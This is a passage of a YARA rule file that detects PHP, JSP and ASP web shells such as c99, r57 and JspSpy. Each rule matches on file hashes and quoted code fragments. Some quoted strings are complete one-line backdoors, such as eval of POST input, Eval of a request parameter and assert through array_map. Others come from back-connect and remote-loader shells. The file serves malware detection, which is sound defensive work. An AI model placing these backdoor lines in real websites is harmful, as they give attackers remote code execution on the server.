		hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
		hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash9 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
		$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
		$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
		$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
		$s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
		$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
	condition:
		2 of them
}
rule webshell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
	meta:
		description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "3e4ba470d4c38765e4b16ed930facf2c"
		hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
		hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash3 = "40a1f840111996ff7200d18968e42cfe"
		hash4 = "e0202adff532b28ef1ba206cf95962f2"
		hash5 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$this -> addFile($content, $filename);" fullword
		$s3 = "function addFile($data, $name, $time = 0) {" fullword
		$s8 = "function unix2DosTime($unixtime = 0) {" fullword
		$s9 = "foreach($filelist as $filename){" fullword
	condition:
		all of them
}
rule webshell_c99_c66_c99_shadows_mod_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
		hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv"
		$s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
		$s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66"
		$s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources"
		$s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos"
		$s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!"
	condition:
		2 of them
}
rule webshell_he1p_JspSpy_nogfw_ok_style_1_JspSpy1 {
	meta:
		description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b330a6c2d49124ef0729539761d6ef0b"
		hash1 = "d71716df5042880ef84427acee8b121e"
		hash2 = "344f9073576a066142b2023629539ebd"
		hash3 = "32dea47d9c13f9000c4c807561341bee"
		hash4 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash5 = "3ea688e3439a1f56b16694667938316d"
		hash6 = "2434a7a07cb47ce25b41d30bc291cacc"
	strings:
		$s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
		$s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?"
		$s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
		$s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>"
	condition:
		2 of them
}
rule webshell_000_403_c5_config_myxx_queryDong_spyjsp2010_zend {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash4 = "e0354099bee243702eb11df8d0e046df"
		hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash6 = "655722eaa6c646437c8ae93daac46ae0"
		hash7 = "591ca89a25f06cf01e4345f98a22845c"
	strings:
		$s0 = "return new Double(format.format(value)).doubleValue();" fullword
		$s5 = "File tempF = new File(savePath);" fullword
		$s9 = "if (tempF.isDirectory()) {" fullword
	condition:
		2 of them
}
rule webshell_c99_c99shell_c99_c99shell {
	meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"
	strings:
		$s2 = "$bindport_pass = \"c99\";" fullword
		$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"
	condition:
		1 of them
}
rule webshell_r57shell127_r57_iFX_r57_kartal_r57_antichat {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash4 = "3f71175985848ee46cc13282fbed2269"
	strings:
		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
	condition:
		2 of them
}
rule webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx {
	meta:
		description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "4745d510fed4378e4b1730f56f25e569"
		hash2 = "f3ca29b7999643507081caab926e2e74"
		hash3 = "46a18979750fa458a04343cf58faa9bd"
	strings:
		$s3 = "BODY, TD, TR {" fullword
		$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
		$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
	condition:
		2 of them
}
rule webshell_000_403_807_a_c5_config_css_dm_he1p_xxx {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, 807.jsp, a.jsp, c5.jsp, config.jsp, css.jsp, dm.jsp, he1p.jsp, JspSpy.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, luci.jsp.spy2009.jsp, m.jsp, ma3.jsp, mmym520.jsp, myxx.jsp, nogfw.jsp, ok.jsp, queryDong.jsp, spyjsp2010.jsp, style.jsp, u.jsp, xia.jsp, zend.jsp, cofigrue.jsp, 1.jsp, jspspy.jsp, jspspy_k8.jsp, JspSpy.jsp, JspSpyJDK5.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "6acc82544be056580c3a1caaa4999956"
		hash23 = "6aa32a6392840e161a018f3907a86968"
		hash24 = "591ca89a25f06cf01e4345f98a22845c"
		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash26 = "3ea688e3439a1f56b16694667938316d"
		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
		hash28 = "71097537a91fac6b01f46f66ee2d7749"
		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"
	strings:
		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
		$s9 = "sis = request.getInputStream();" fullword
	condition:
		4 of them
}
rule webshell_2_520_icesword_job_ma1 {
	meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"
	strings:
		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
	condition:
		2 of them
}
rule webshell_404_data_in_JFolder_jfolder01_jsp_suiyue_warn {
	meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash7 = "e9a5280f77537e23da2545306f6a19ad"
	strings:
		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
		$s2 = " KB </td>" fullword
		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
		$s4 = "<!-- <tr align=\"center\"> " fullword
	condition:
		all of them
}
rule webshell_r57shell_r57shell127_SnIpEr_SA_xxx {
	meta:
		description = "Web Shell - from files r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_Mohajer22.php, r57.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, r57.php, Backdoor.PHP.Agent.php, hkrkoz.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ef43fef943e9df90ddb6257950b3538f"
		hash1 = "ae025c886fbe7f9ed159f49593674832"
		hash2 = "911195a9b7c010f61b66439d9048f400"
		hash3 = "697dae78c040150daff7db751fc0c03c"
		hash4 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash5 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash6 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash7 = "40a1f840111996ff7200d18968e42cfe"
		hash8 = "e0202adff532b28ef1ba206cf95962f2"
		hash9 = "41af6fd253648885c7ad2ed524e0692d"
		hash10 = "6fcc283470465eed4870bcc3e2d7f14d"
		hash11 = "802f5cae46d394b297482fd0c27cb2fc"
	strings:
		$s0 = "$this -> datasec[] = $fr;" fullword
		$s4 = "$name     = str_replace('\\\\', '/', $name);" fullword
		$s5 = "$this -> eof_ctrl_dir ." fullword
		$s6 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7]" fullword
		$s9 = "$c_len   = strlen($zdata);" fullword
	condition:
		all of them
}
rule webshell_phpspy_2005_full_phpspy_2005_lite_phpspy_2006_PHPSPY {
	meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "40a1f840111996ff7200d18968e42cfe"
		hash3 = "0712e3dc262b4e1f98ed25760b206836"
	strings:
		$s4 = "http://www.4ngel.net" fullword
		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
		$s9 = "Codz by Angel" fullword
	condition:
		2 of them
}
rule webshell_c99_locus7s_c99_w4cking_xxx {
	meta:
		description = "Web Shell - from files c99_locus7s.php, c99_w4cking.php, r57shell.php, r57shell127.php, SnIpEr_SA Shell.php, EgY_SpIdEr ShElL V2.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57.php, acid.php, newsh.php, r57.php, Backdoor.PHP.Agent.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
		hash1 = "9c34adbc8fd8d908cbb341734830f971"
		hash2 = "ef43fef943e9df90ddb6257950b3538f"
		hash3 = "ae025c886fbe7f9ed159f49593674832"
		hash4 = "911195a9b7c010f61b66439d9048f400"
		hash5 = "697dae78c040150daff7db751fc0c03c"
		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
		hash12 = "41af6fd253648885c7ad2ed524e0692d"
		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"
	strings:
		$s1 = "$res = @shell_exec($cfe);" fullword
		$s8 = "$res = @ob_get_contents();" fullword
		$s9 = "@exec($cfe,$res);" fullword
	condition:
		2 of them
}
rule webshell_browser_201_3_ma_ma2_download {
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"
	strings:
		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
		$s2 = "private static String tempdir = \".\";" fullword
		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""
	condition:
		2 of them
}
rule webshell_000_403_c5_queryDong_spyjsp2010 {
	meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"
	strings:
		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
	condition:
		2 of them
}
rule webshell_r57shell127_r57_kartal_r57 {
	meta:
		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
	strings:
		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
	condition:
		2 of them
}

rule webshell_webshells_new_con2 {
	meta:
		description = "Web shells - generated from file con2.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "d3584159ab299d546bd77c9654932ae3"
	strings:
		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
	condition:
		1 of them
}
rule webshell_webshells_new_make2 {
	meta:
		description = "Web shells - generated from file make2.php"
		author = "Florian Roth"
		date = "2014/03/28"
		hash = "9af195491101e0816a263c106e4c145e"
		score = 50
	strings:
		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"
	condition:
		all of them
}
rule webshell_webshells_new_aaa {
	meta:
		description = "Web shells - generated from file aaa.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "68483788ab171a155db5266310c852b2"
	strings:
		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
	condition:
		1 of them
}
rule webshell_Expdoor_com_ASP {
	meta:
		description = "Web shells - generated from file Expdoor.com ASP.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "caef01bb8906d909f24d1fa109ea18a7"
	strings:
		$s4 = "\">www.Expdoor.com</a>" fullword
		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
		$s16 = "<TITLE>Expdoor.com ASP" fullword
	condition:
		2 of them
}
rule webshell_webshells_new_php2 {
	meta:
		description = "Web shells - generated from file php2.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "fbf2e76e6f897f6f42b896c855069276"
	strings:
		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="
	condition:
		all of them
}
rule webshell_bypass_iisuser_p {
	meta:
		description = "Web shells - generated from file bypass-iisuser-p.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "924d294400a64fa888a79316fb3ccd90"
	strings:
		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"
	condition:
		all of them
}
rule webshell_sig_404super {
	meta:
		description = "Web shells - generated from file 404super.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "7ed63176226f83d36dce47ce82507b28"
	strings:
		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
		$s7 = "//http://require.duapp.com/session.php" fullword
		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
		$s12 = "//define('pass','123456');" fullword
		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
	condition:
		1 of them
}
rule webshell_webshells_new_JSP {
	meta:
		description = "Web shells - generated from file JSP.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "495f1a0a4c82f986f4bdf51ae1898ee7"
	strings:
		$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
		$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
		$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
	condition:
		1 of them
}
rule webshell_webshell_123 {
	meta:
		description = "Web shells - generated from file webshell-123.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "2782bb170acaed3829ea9a04f0ac7218"
	strings:
		$s0 = "// Web Shell!!" fullword
		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
		$s3 = "$default_charset = \"UTF-8\";" fullword
		$s4 = "// url:http://www.weigongkai.com/shell/" fullword
	condition:
		2 of them
}
rule webshell_dev_core {
	meta:
		description = "Web shells - generated from file dev_core.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "55ad9309b006884f660c41e53150fc2e"
	strings:
		$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
		$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
		$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
		$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
		$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
		$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
	condition:
		1 of them
}
rule webshell_webshells_new_pHp {
	meta:
		description = "Web shells - generated from file pHp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b0e842bdf83396c3ef8c71ff94e64167"
	strings:
		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"
	condition:
		1 of them
}
rule webshell_webshells_new_pppp {
	meta:
		description = "Web shells - generated from file pppp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "cf01cb6e09ee594545693c5d327bdd50"
	strings:
		$s0 = "Mail: chinese@hackermail.com" fullword
		$s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "
		$s6 = "Site: http://blog.weili.me" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_code {
	meta:
		description = "Web shells - generated from file code.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "a444014c134ff24c0be5a05c02b81a79"
	strings:
		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
	condition:
		1 of them
}
rule webshell_webshells_new_jspyyy {
	meta:
		description = "Web shells - generated from file jspyyy.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
	condition:
		all of them
}
rule webshell_webshells_new_xxxx {
	meta:
		description = "Web shells - generated from file xxxx.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "5bcba70b2137375225d8eedcde2c0ebb"
	strings:
		$s0 = "<?php eval($_POST[1]);?>  " fullword
	condition:
		all of them
}
rule webshell_webshells_new_JJjsp3 {
	meta:
		description = "Web shells - generated from file JJjsp3.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "949ffee1e07a1269df7c69b9722d293e"
	strings:
		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
	condition:
		all of them
}
rule webshell_webshells_new_PHP1 {
	meta:
		description = "Web shells - generated from file PHP1.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
	strings:
		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
	condition:
		1 of them
}
rule webshell_webshells_new_JJJsp2 {
	meta:
		description = "Web shells - generated from file JJJsp2.jsp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "5a9fec45236768069c99f0bfd566d754"
	strings:
		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
	condition:
		1 of them
}
rule webshell_webshells_new_radhat {
	meta:
		description = "Web shells - generated from file radhat.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "72cb5ef226834ed791144abaa0acdfd4"
	strings:
		$s1 = "sod=Array(\"D\",\"7\",\"S"
	condition:
		all of them
}
rule webshell_webshells_new_asp1 {
	meta:
		description = "Web shells - generated from file asp1.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "b63e708cd58ae1ec85cf784060b69cad"
	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_php6 {
	meta:
		description = "Web shells - generated from file php6.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "ea75280224a735f1e445d244acdfeb7b"
	strings:
		$s1 = "array_map(\"asx73ert\",(ar"
		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
		$s4 = "shell.php?qid=zxexp  " fullword
	condition:
		1 of them
}
rule webshell_webshells_new_xxx {
	meta:
		description = "Web shells - generated from file xxx.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
	condition:
		all of them
}
rule webshell_GetPostpHp {
	meta:
		description = "Web shells - generated from file GetPostpHp.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "20ede5b8182d952728d594e6f2bb5c76"
	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
	condition:
		all of them
}
rule webshell_webshells_new_php5 {
	meta:
		description = "Web shells - generated from file php5.php"
